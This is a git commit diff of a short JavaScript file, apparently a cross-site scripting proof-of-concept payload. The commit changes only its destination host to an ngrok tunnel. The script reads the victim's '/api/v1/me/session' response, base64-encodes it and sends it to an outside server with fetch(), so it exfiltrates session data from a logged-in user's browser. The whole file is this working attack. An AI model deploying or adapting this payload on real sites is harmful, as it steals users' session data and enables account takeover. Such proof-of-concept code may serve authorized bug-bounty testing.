0251e7b042b086aa2c808a583e9dd0111ddae676
scan9 <142240382+nscan9@users.noreply.github.com>
2025-12-19 17:55:37 +0400

    Update and rename ok.js to test2.js

--- test2.js
+++ test2.js
@@ -2,7 +2,7 @@ var xhr = new XMLHttpRequest();
 xhr.open('GET', '/api/v1/me/session', true);
 xhr.onload = function() {
 		if (xhr.status === 200) {
-			fetch('https://xss.hackwithnahamsec.com/POC/?x=' + btoa(xhr.responseText) );
+			fetch('https://9909b2d4c6c9.ngrok-free.app/POC/?x=' + btoa(xhr.responseText) );
 		}
 };
 xhr.send();
